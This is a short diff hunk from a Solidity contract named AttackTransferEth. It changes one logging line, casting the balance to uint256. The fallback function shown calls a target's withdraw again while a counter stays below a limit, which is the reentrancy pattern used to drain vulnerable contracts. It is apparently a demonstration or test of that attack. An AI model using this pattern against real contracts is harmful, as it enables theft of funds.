@@ -17,7 +17,7 @@ contract AttackTransferEth {
 
     function () public payable{
         i++;
-        LogAttack(i, this.balance);
+        LogAttack(i, uint256(this.balance));
         if (i < count) teth.withdraw(value);
 
     }
